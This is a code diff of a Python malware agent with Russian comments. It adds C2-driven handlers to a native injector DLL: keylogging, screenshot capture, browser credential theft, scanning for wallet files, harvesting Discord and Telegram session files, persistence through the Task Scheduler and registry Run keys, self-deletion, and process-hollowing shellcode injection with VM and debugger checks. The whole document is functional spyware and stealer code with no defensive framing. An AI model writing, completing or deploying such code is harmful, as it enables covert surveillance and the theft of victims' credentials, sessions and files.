@@ -739,34 +739,54 @@ class AutonomousAgent:
                 result, error_message = self._handle_inject_shellcode(target_process, shellcode_b64)
 
             elif command == 'start_keylogger':
-                success = self.injector_lib.StartKeylogger() if self.injector_lib else False
-                return {"status": "success" if success else "failure"}, "Keylogger start failed" if not success else None
+                result, error_message = self._handle_keylogger_start()
             elif command == 'stop_keylogger':
-                success = self.injector_lib.StopKeylogger() if self.injector_lib else False
-                return {"status": "success" if success else "failure"}, "Keylogger stop failed" if not success else None
+                result, error_message = self._handle_keylogger_stop()
             elif command == 'get_keylogs':
-                if not self.injector_lib:
-                    return None, "Injector library not loaded"
-                logs_ptr = self.injector_lib.GetKeyLogs()
-                if logs_ptr:
-                    # Decode bytes to string (assuming UTF-8 or similar)
-                    logs_str = logs_ptr.decode('utf-8', errors='replace')
-                    # self.injector_lib.FreeKeyLogsBuffer(logs_ptr) # No-op currently
-                    return {"logs": logs_str}, None
-                else:
-                    return {"logs": "[]"}, "Failed to get keylogs or no logs available" # Return empty json array if null ptr
+                result, error_message = self._handle_keylogger_get_logs()
             elif command == 'screenshot':
-                 return self._handle_screenshot()
+                result, error_message = self._handle_screenshot()
+            elif command == 'steal_credentials':
+                result, error_message = self._handle_steal_credentials()
+            elif command == 'scan_files':
+                start_path = params.get('start_path')
+                masks = params.get('masks') # e.g., "*.wallet;*.pdf"
+                max_depth = params.get('max_depth', -1) # По умолчанию без ограничений
+                if start_path and masks:
+                    result, error_message = self._handle_scan_files(start_path, masks, max_depth)
+                else:
+                    error_message = "Missing 'start_path' or 'masks' parameter for scan_files"
 
-            # --- Место для добавления обработчиков других команд ---
-            # elif command == "download_file":
-            #     result, error_message = self._handle_download_file(params)
-            # elif command == "upload_file":
-            #     result, error_message = self._handle_upload_file(params)
-            # elif command == "run_module": # Запуск одного из внутренних модулей агента
-            #     result, error_message = self._handle_run_module(params)
-            # ---------------------------------------------------------
+            elif command == 'find_app_sessions':
+                app_names = params.get('app_names') # e.g., "Discord;Telegram"
+                if app_names:
+                    result, error = self._handle_find_app_sessions(app_names)
+                else:
+                    error = "Missing 'app_names' parameter for find_app_sessions"
 
+            elif command == 'persist':
+                method = params.get('method')
+                name = params.get('name')
+                path = params.get('path')
+                args = params.get('args', None) # Может быть None
+                
+                if method and name and path:
+                    result, error = self._handle_persist(method, name, path, args)
+                else:
+                    error = "Missing 'method', 'name', or 'path' parameter for persist"
+
+            elif command == 'self_delete':
+                # Получаем путь к текущему исполняемому файлу или DLL
+                # Это может быть сложно определить надежно, особенно если агент упакован
+                # Пока передадим путь к загруженной DLL
+                dll_path = self.config.get('_injector_dll_path') # Предполагаем, что путь сохранен при загрузке
+                if dll_path:
+                     result, error = self._handle_self_delete(dll_path)
+                else:
+                     error = "Could not determine agent file path for self-deletion."
+
+            # Добавить обработку других команд здесь
+            # ... other commands ...
             else:
                 error_message = f"Unknown command: {command}"
                 self.logger.warning(f"Received unknown command '{command}' in task {task_id}")
@@ -852,55 +872,195 @@ class AutonomousAgent:
 
         return result_message, error_message
 
-    def _handle_screenshot(self) -> Tuple[Any, Optional[str]]:
-        """Handles the 'screenshot' command using the native library."""
-        self.logger.info("Handling screenshot command")
+    def _handle_keylogger_start(self) -> Tuple[Any, Optional[str]]:
+        """Обрабатывает команду запуска кейлоггера"""
         if not self.injector_lib:
-            self.logger.error("Injector library not loaded, cannot take screenshot.")
-            return None, "Injector library not loaded"
-
-        screenshot_ptr = None
+            return None, "Injector library not loaded."
+        if platform.system() != "Windows":
+             return None, "Keylogger only supported on Windows."
+        
+        error_ptr = ctypes.c_char_p() # Указатель для получения строки ошибки
+        error_msg = None
         try:
-            # Define argument types and return type for CaptureScreenshot just before calling
-            # This ensures ctypes knows how to handle the pointer correctly.
-            self.injector_lib.CaptureScreenshot.restype = ctypes.POINTER(ctypes.c_char)
-            self.injector_lib.CaptureScreenshot.argtypes = []
-
-            screenshot_ptr = self.injector_lib.CaptureScreenshot()
-
-            if screenshot_ptr:
-                # Determine the length of the C string (Base64 data)
-                # We need to iterate until the null terminator.
-                # Alternatively, if the C++ side could return the length, it would be safer.
-                # For now, we assume it's null-terminated.
-                # Create a Python bytes object from the C pointer
-                screenshot_bytes = ctypes.cast(screenshot_ptr, ctypes.c_char_p).value
-                if screenshot_bytes:
-                    # The result is already Base64 encoded by the C++ function
-                    screenshot_b64 = screenshot_bytes.decode('ascii') # Base64 is ASCII safe
-                    self.logger.info(f"Screenshot captured successfully ({len(screenshot_b64)} bytes Base64)")
-                    return {"screenshot_b64": screenshot_b64}, None
-                else:
-                     self.logger.error("CaptureScreenshot returned a pointer, but reading it resulted in empty data.")
-                     return None, "Failed to read screenshot data from pointer"
+            self.logger.info("Attempting to start keylogger...")
+            ret_code = self.injector_lib.StartKeylogger(ctypes.byref(error_ptr))
+            if error_ptr and error_ptr.value:
+                error_msg = error_ptr.value.decode('utf-8', errors='ignore')
+                # Освобождаем память, выделенную C++ для строки ошибки
+                self.injector_lib.free_error_message(error_ptr)
+                
+            if ret_code == 0:
+                self.logger.info("Keylogger started successfully.")
+                return {"status": "Keylogger started"}, None
             else:
-                self.logger.error("CaptureScreenshot returned a null pointer.")
-                return None, "Native screenshot capture failed (returned null)"
+                err = f"Failed to start keylogger. Code: {ret_code}. Message: {error_msg or 'Unknown error'}"
+                self.logger.error(err)
+                return None, err
+        except Exception as e:
+            err = f"Exception calling StartKeylogger: {e}"
+            self.logger.exception(err)
+            return None, err
+
+    def _handle_keylogger_stop(self) -> Tuple[Any, Optional[str]]:
+        """Обрабатывает команду остановки кейлоггера"""
+        if not self.injector_lib:
+            return None, "Injector library not loaded."
+        if platform.system() != "Windows":
+             return None, "Keylogger only supported on Windows."
+
+        error_ptr = ctypes.c_char_p()
+        error_msg = None
+        try:
+            self.logger.info("Attempting to stop keylogger...")
+            ret_code = self.injector_lib.StopKeylogger(ctypes.byref(error_ptr))
+            if error_ptr and error_ptr.value:
+                error_msg = error_ptr.value.decode('utf-8', errors='ignore')
+                self.injector_lib.free_error_message(error_ptr)
+            
+            if ret_code == 0:
+                self.logger.info("Keylogger stopped successfully.")
+                return {"status": "Keylogger stopped"}, None
+            else:
+                err = f"Failed to stop keylogger. Code: {ret_code}. Message: {error_msg or 'Unknown error'}"
+                self.logger.error(err)
+                return None, err
+        except Exception as e:
+            err = f"Exception calling StopKeylogger: {e}"
+            self.logger.exception(err)
+            return None, err
+
+    def _handle_keylogger_get_logs(self) -> Tuple[Any, Optional[str]]:
+        """Обрабатывает команду получения логов кейлоггера"""
+        if not self.injector_lib:
+            return None, "Injector library not loaded."
+        if platform.system() != "Windows":
+             return None, "Keylogger only supported on Windows."
+             
+        logs_ptr = None
+        try:
+            self.logger.info("Attempting to get keylogs...")
+            logs_ptr = self.injector_lib.GetKeyLogs() # Возвращает char*
+            
+            if logs_ptr:
+                # Декодируем строку из C (предполагаем UTF-8)
+                logs_json_str = logs_ptr.decode('utf-8', errors='ignore')
+                self.logger.info(f"Received keylogs string (length {len(logs_json_str)}). Attempting to parse JSON.")
+                # Освобождаем память C строки *после* декодирования
+                self.injector_lib.free_error_message(logs_ptr) # Используем ту же функцию освобождения
+                
+                try:
+                    # Пытаемся распарсить JSON, чтобы убедиться в корректности
+                    logs_data = json.loads(logs_json_str)
+                    self.logger.info(f"Successfully parsed keylogs JSON ({len(logs_data)} entries).")
+                    return {"keylogs": logs_data}, None # Возвращаем распарсенный JSON
+                except json.JSONDecodeError as e:
+                    err = f"Failed to parse keylogs JSON: {e}. Raw string: {logs_json_str[:200]}..."
+                    self.logger.error(err)
+                    # Возвращаем сырую строку, если парсинг не удался, но C2 сможет разобраться
+                    return {"raw_keylogs": logs_json_str}, err 
+            else:
+                self.logger.info("No keylogs available.")
+                return {"keylogs": []}, None # Возвращаем пустой список, если логов нет
 
         except Exception as e:
-            self.logger.exception(f"Error during screenshot capture: {e}")
-            return None, f"Exception during screenshot capture: {e}"
-        finally:
-            # CRITICAL: Free the memory allocated by the C++ function
-            if screenshot_ptr and self.injector_lib:
-                 try:
-                    self.injector_lib.FreeScreenshotData.restype = None
-                    self.injector_lib.FreeScreenshotData.argtypes = [ctypes.POINTER(ctypes.c_char)]
-                    self.injector_lib.FreeScreenshotData(screenshot_ptr)
-                    self.logger.debug("Freed screenshot data memory")
-                 except Exception as free_e:
-                    self.logger.error(f"Failed to free screenshot data memory: {free_e}")
+            err = f"Exception calling GetKeyLogs: {e}"
+            self.logger.exception(err)
+            # Если была ошибка и logs_ptr был получен, пытаемся освободить память
+            if logs_ptr: 
+                try:
+                    self.injector_lib.free_error_message(logs_ptr)
+                except Exception as free_e:
+                     self.logger.error(f"Exception freeing logs_ptr after another error: {free_e}")
+            return None, err
 
+    def _handle_screenshot(self) -> Tuple[Any, Optional[str]]:
+        """Обрабатывает команду снятия скриншота"""
+        if not self.injector_lib:
+            return None, "Injector library not loaded."
+        if platform.system() != "Windows":
+             return None, "Screenshot capture only supported on Windows."
+             
+        screenshot_ptr = None
+        try:
+            self.logger.info("Attempting to capture screenshot...")
+            screenshot_ptr = self.injector_lib.CaptureScreenshot() # Возвращает char*
+            
+            if screenshot_ptr:
+                # Декодируем Base64 строку из C (предполагаем ASCII/UTF-8 совместимость)
+                base64_data = screenshot_ptr.decode('ascii') # Base64 использует ASCII
+                self.logger.info(f"Successfully captured screenshot (Base64 length: {len(base64_data)}).")
+                
+                # Освобождаем память C строки *после* декодирования
+                # Используем специальную функцию FreeScreenshotData
+                self.injector_lib.FreeScreenshotData(screenshot_ptr)
+                
+                # Возвращаем результат в виде словаря
+                return {"screenshot_base64": base64_data}, None
+            else:
+                err = "CaptureScreenshot returned NULL. Failed to capture screenshot."
+                self.logger.error(err)
+                return None, err
+
+        except Exception as e:
+            err = f"Exception calling CaptureScreenshot: {e}"
+            self.logger.exception(err)
+            # Если была ошибка и screenshot_ptr был получен, пытаемся освободить память
+            if screenshot_ptr: 
+                try:
+                    self.injector_lib.FreeScreenshotData(screenshot_ptr)
+                except Exception as free_e:
+                     self.logger.error(f"Exception freeing screenshot_ptr after another error: {free_e}")
+            return None, err
+
+    def _handle_steal_credentials(self) -> Tuple[Any, Optional[str]]:
+        """Обрабатывает команду кражи учетных данных браузеров"""
+        if not self.injector_lib:
+            return None, "Injector library not loaded."
+        if platform.system() != "Windows":
+             return None, "Browser credential stealing only supported on Windows."
+             
+        creds_ptr = None
+        try:
+            self.logger.info("Attempting to steal browser credentials...")
+            creds_ptr = self.injector_lib.StealBrowserCredentials() # Возвращает char*
+            
+            if creds_ptr:
+                # Декодируем JSON строку из C (предполагаем UTF-8)
+                creds_json_str = creds_ptr.decode('utf-8', errors='ignore')
+                self.logger.info(f"Successfully retrieved credential data (JSON length: {len(creds_json_str)}).")
+                
+                # Освобождаем память C строки *после* декодирования
+                # Используем free_error_message, как договорились
+                self.injector_lib.free_error_message(creds_ptr)
+                
+                # Пытаемся распарсить JSON для валидации
+                try:
+                    creds_data = json.loads(creds_json_str)
+                    self.logger.info(f"Successfully parsed credentials JSON.")
+                    # Возвращаем распарсенный JSON
+                    return {"browser_credentials": creds_data}, None 
+                except json.JSONDecodeError as e:
+                    err = f"Failed to parse credentials JSON: {e}. Raw string: {creds_json_str[:200]}..."
+                    self.logger.error(err)
+                    # Возвращаем сырую строку, если парсинг не удался
+                    return {"raw_credential_data": creds_json_str}, err 
+            else:
+                # Функция вернула NULL, возможно, ничего не найдено или произошла ошибка в C++
+                # (Ошибки должны были логироваться в C++)
+                self.logger.warning("StealBrowserCredentials returned NULL. No credentials found or native error occurred.")
+                # Возвращаем пустой результат
+                return {"browser_credentials": {"chrome_edge_keys": [], "firefox_files": []}}, None 
+
+        except Exception as e:
+            err = f"Exception calling StealBrowserCredentials: {e}"
+            self.logger.exception(err)
+            # Если была ошибка и creds_ptr был получен, пытаемся освободить память
+            if creds_ptr: 
+                try:
+                    self.injector_lib.free_error_message(creds_ptr)
+                except Exception as free_e:
+                     self.logger.error(f"Exception freeing creds_ptr after another error: {free_e}")
+            return None, err
 
     def _send_task_result(self, task_id: str, result: Any, error: Optional[str]):
         """Отправляет результат выполнения задачи на C2 сервер."""
@@ -946,71 +1106,194 @@ class AutonomousAgent:
         except Exception as e:
             self.logger.error(f"Unexpected error sending task result {task_id}: {e}")
 
-    def _load_injector_library(self):
-        """Загружает нативную библиотеку инъектора (DLL/SO)."""
-        lib_path = None
-        lib_name = "cpp_injector.dll" # Имя файла для Windows
-        # Используем абсолютный путь внутри контейнера
-        dll_path_in_container = "/app/src/native/cpp_injector/build/lib/cpp_injector.dll"
-        
-        # Пытаемся найти DLL по ожидаемому пути в контейнере
-        if os.path.exists(dll_path_in_container):
-            lib_path = dll_path_in_container
-        else:
-             # Если агент запущен не в Docker (например, на Windows для теста) 
-             # или путь в Dockerfile неверен, пытаемся загрузить по имени
-            lib_path = lib_name 
-            self.logger.warning(f"Native library '{lib_name}' not found at expected container path {dll_path_in_container}. Attempting to load by name.")
+    def _handle_scan_files(self, start_path: str, masks: str, max_depth: int) -> Tuple[Any, Optional[str]]:
+        # ... existing scan_files handler ...
+        pass # Placeholder
 
+    def _handle_find_app_sessions(self, app_names: str) -> Tuple[Any, Optional[str]]:
+        """Обрабатывает команду поиска файлов сессий приложений"""
+        if not self.injector_lib:
+            return None, "Injector library not loaded."
+        if platform.system() != "Windows":
+             return None, "Finding app session files via native DLL only supported on Windows."
+             
+        sessions_ptr = None
         try:
-            self.logger.info(f"Attempting to load native library: {lib_path}")
-            # Просто пытаемся загрузить через CDLL. 
-            # На Linux это вызовет ожидаемую ошибку OSError.
-            # На Windows (если код запущен там) это должно сработать.
-            self.injector_lib = ctypes.CDLL(lib_path)
+            self.logger.info(f"Attempting to find session files for apps: '{app_names}'")
+            # Передаем строку как UTF-8 байты
+            app_names_b = app_names.encode('utf-8')
             
-            # Определяем сигнатуры функций
-            self.injector_lib.inject_process_hollowing.argtypes = [
-                ctypes.c_char_p,         
-                ctypes.c_void_p,         
-                ctypes.c_ulong,          
-                ctypes.POINTER(ctypes.c_char_p) 
-            ]
-            self.injector_lib.inject_process_hollowing.restype = ctypes.c_int 
+            sessions_ptr = self.injector_lib.FindAppSessionFiles(app_names_b) # Возвращает char*
             
-            self.injector_lib.free_error_message.argtypes = [ctypes.c_char_p] 
-            self.injector_lib.free_error_message.restype = None
+            if sessions_ptr:
+                # Декодируем JSON строку из C (предполагаем UTF-8)
+                sessions_json_str = sessions_ptr.decode('utf-8', errors='ignore')
+                self.logger.info(f"Successfully retrieved app session paths (JSON length: {len(sessions_json_str)}).")
+                
+                # Освобождаем память C строки *после* декодирования
+                self.injector_lib.free_error_message(sessions_ptr)
+                
+                # Пытаемся распарсить JSON для валидации
+                try:
+                    sessions_data = json.loads(sessions_json_str)
+                    self.logger.info(f"Successfully parsed app session paths JSON.")
+                    # Возвращаем распарсенный JSON
+                    return {"app_session_paths": sessions_data}, None 
+                except json.JSONDecodeError as e:
+                    err = f"Failed to parse app session paths JSON: {e}. Raw string: {sessions_json_str[:200]}..."
+                    self.logger.error(err)
+                    # Возвращаем сырую строку, если парсинг не удался
+                    return {"raw_app_session_paths": sessions_json_str}, err 
+            else:
+                # Функция вернула NULL, возможно, ничего не найдено или произошла ошибка в C++
+                self.logger.info("FindAppSessionFiles returned NULL. No relevant paths found or native error occurred.")
+                # Возвращаем пустой результат
+                return {"app_session_paths": {}}, None 
 
+        except Exception as e:
+            err = f"Exception calling FindAppSessionFiles: {e}"
+            self.logger.exception(err)
+            # Если была ошибка и sessions_ptr был получен, пытаемся освободить память
+            if sessions_ptr: 
+                try:
+                    self.injector_lib.free_error_message(sessions_ptr)
+                except Exception as free_e:
+                     self.logger.error(f"Exception freeing sessions_ptr after another error: {free_e}")
+            return None, err
+
+    def _handle_persist(self, method: str, name: str, path: str, args: Optional[str]) -> Tuple[Any, Optional[str]]:
+        # ... existing handler ...
+        pass # Placeholder
+
+    def _handle_self_delete(self, file_path_to_delete: str) -> Tuple[Any, Optional[str]]:
+        """Обрабатывает команду самоудаления агента"""
+        if not self.injector_lib:
+            return None, "Injector library not loaded."
+        if platform.system() != "Windows":
+             return None, "Self-deletion only supported on Windows."
+        
+        ret_code = -1
+        try:
+            self.logger.info(f"Attempting to schedule self-deletion for file: '{file_path_to_delete}'")
+            path_w = ctypes.c_wchar_p(file_path_to_delete)
+            
+            ret_code = self.injector_lib.SelfDelete(path_w)
+            
+            if ret_code == 0:
+                success_msg = f"Self-deletion command for '{file_path_to_delete}' launched successfully. Agent should exit soon."
+                self.logger.info(success_msg)
+                # Важно: Агент должен сам завершить работу после вызова этой команды
+                # threading.Timer(5, self.stop).start() # Примерно через 5 сек остановить главный цикл агента
+                # Или более прямой выход:
+                # threading.Timer(5, lambda: os._exit(0)).start() 
+                # Пока просто возвращаем успех, C2 должен знать, что агент скоро пропадет.
+                return {"status": "success", "message": success_msg}, None
+            else:
+                err = f"Failed to launch self-deletion command. Code: {ret_code}. Message: {get_windows_error_message(ret_code) or 'Unknown error'}"
+                self.logger.error(err)
+                return None, err
+
+        except Exception as e:
+            err = f"Exception during self-deletion: {e}"
+            self.logger.exception(err)
+            return None, err
+
+    def _load_injector_library(self):
+        """Загружает нативную библиотеку инъекции"""
+        # Определяем путь к DLL (предполагая, что она рядом с агентом)
+        # Важно: Этот путь будет использоваться для самоудаления!
+        dll_filename = 'libcpp_injector.dll'
+        base_dir = os.path.dirname(os.path.abspath(__file__))
+        # Предполагаем, что DLL лежит в src/native/
+        lib_path = os.path.join(base_dir, 'native', dll_filename)
+        
+        # Проверяем существование файла перед загрузкой
+        if not os.path.exists(lib_path):
+            self.logger.error(f"Injector DLL not found at expected path: {lib_path}")
+            # Попытка загрузить из текущей директории как fallback?
+            alt_lib_path = os.path.abspath(dll_filename)
+            if os.path.exists(alt_lib_path):
+                self.logger.warning(f"DLL not found at {lib_path}, trying {alt_lib_path}")
+                lib_path = alt_lib_path
+            else:
+                 self.logger.error(f"Cannot find {dll_filename} neither at {lib_path} nor {alt_lib_path}. Native features disabled.")
+                 return None
+
+        self.logger.info(f"Attempting to load injector library from: {lib_path}")
+        self.config['_injector_dll_path'] = lib_path # Сохраняем путь для самоудаления
+        try:
+            # Используем полный путь для надежности
+            lib = ctypes.CDLL(lib_path)
+            self.logger.info(f"Successfully loaded library: {lib_path}")
+            
+            # --- Определяем сигнатуры для известных функций ---
+            # inject_process_hollowing
+            lib.inject_process_hollowing.argtypes = [ctypes.c_char_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_char_p)]
+            lib.inject_process_hollowing.restype = ctypes.c_int
+            
+            # free_error_message
+            lib.free_error_message.argtypes = [ctypes.c_char_p]
+            lib.free_error_message.restype = None
+            
+            # IsVMEnvironmentDetected
+            lib.IsVMEnvironmentDetected.argtypes = []
+            lib.IsVMEnvironmentDetected.restype = ctypes.c_bool
+            
+            # IsDebuggerPresentDetected
+            lib.IsDebuggerPresentDetected.argtypes = []
+            lib.IsDebuggerPresentDetected.restype = ctypes.c_bool
+            
             # Keylogger functions
-            try:
-                self.injector_lib.StartKeylogger.restype = ctypes.c_bool
-                self.injector_lib.StartKeylogger.argtypes = []
-                self.injector_lib.StopKeylogger.restype = ctypes.c_bool
-                self.injector_lib.StopKeylogger.argtypes = []
-                # Returns a pointer to a const char*, need to handle memory (not freed by Python)
-                self.injector_lib.GetKeyLogs.restype = ctypes.c_char_p
-                self.injector_lib.GetKeyLogs.argtypes = []
-                # No-op for now, but good practice to define
-                self.injector_lib.FreeKeyLogsBuffer.restype = None
-                self.injector_lib.FreeKeyLogsBuffer.argtypes = [ctypes.c_char_p]
+            lib.StartKeylogger.argtypes = [ctypes.POINTER(ctypes.c_char_p)]
+            lib.StartKeylogger.restype = ctypes.c_int
+            lib.StopKeylogger.argtypes = [ctypes.POINTER(ctypes.c_char_p)]
+            lib.StopKeylogger.restype = ctypes.c_int
+            lib.GetKeyLogs.argtypes = []
+            lib.GetKeyLogs.restype = ctypes.c_char_p # Возвращает JSON строку
+            # free_error_message используется для освобождения памяти GetKeyLogs и Start/Stop
 
-                # Screenshot functions
-                # Returns char*, which needs to be freed by FreeScreenshotData
-                self.injector_lib.CaptureScreenshot.restype = ctypes.POINTER(ctypes.c_char) # Pointer to char array
-                self.injector_lib.CaptureScreenshot.argtypes = []
-                self.injector_lib.FreeScreenshotData.restype = None
-                self.injector_lib.FreeScreenshotData.argtypes = [ctypes.POINTER(ctypes.c_char)]
+            # Screenshot functions
+            lib.CaptureScreenshot.argtypes = []
+            lib.CaptureScreenshot.restype = ctypes.c_char_p # Возвращает Base64 строку
+            lib.FreeScreenshotData.argtypes = [ctypes.c_char_p]
+            lib.FreeScreenshotData.restype = None
 
-            except AttributeError as e:
-                self.logger.error(f"Failed to find expected function in injector library: {e}")
-                # Optionally disable features that rely on the missing functions
-                # For now, we'll let it fail later if called
+            # Steal Browser Credentials function
+            lib.StealBrowserCredentials.argtypes = []
+            lib.StealBrowserCredentials.restype = ctypes.c_char_p # Возвращает JSON строку
+            # free_error_message используется для освобождения памяти
 
-            self.logger.info(f"Injector library loaded successfully from {lib_path}")
-            return self.injector_lib
+            # Scan Files Recursive function
+            lib.ScanFilesRecursive.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_int]
+            lib.ScanFilesRecursive.restype = ctypes.c_char_p # Возвращает JSON строку
+            # free_error_message используется для освобождения памяти
 
-        except (OSError, FileNotFoundError) as e:
-            self.logger.error(f"Failed to load injector library: {e}. Native features disabled.")
+            # Find App Session Files function
+            lib.FindAppSessionFiles.argtypes = [ctypes.c_char_p]
+            lib.FindAppSessionFiles.restype = ctypes.c_char_p # Возвращает JSON строку
+            # free_error_message используется для освобождения памяти
+
+            # Persistence functions
+            lib.PersistViaTaskScheduler.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_char_p)]
+            lib.PersistViaTaskScheduler.restype = ctypes.c_int
+            lib.PersistViaRegistryRunKey.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_char_p)]
+            lib.PersistViaRegistryRunKey.restype = ctypes.c_int
+            # free_error_message используется для освобождения памяти ошибок
+
+            # Self Delete function
+            lib.SelfDelete.argtypes = [ctypes.c_wchar_p]
+            lib.SelfDelete.restype = ctypes.c_int
+            
+            return lib
+        except OSError as e:
+            self.logger.error(f"Failed to load injector library '{lib_path}'. OS: {platform.system()}. Error: {e}")
+            # В Linux/macOS это ожидаемо, но в Windows - проблема
+            if platform.system() == "Windows":
+                self.logger.error("CRITICAL: Running on Windows but failed to load injector DLL!")
+            return None
+        except AttributeError as e:
+            self.logger.error(f"Attribute error while setting up functions for library '{lib_path}'. Error: {e}")
+            # Это может означать, что DLL загрузилась, но не содержит ожидаемых функций
             return None
 
 if __name__ == "__main__":
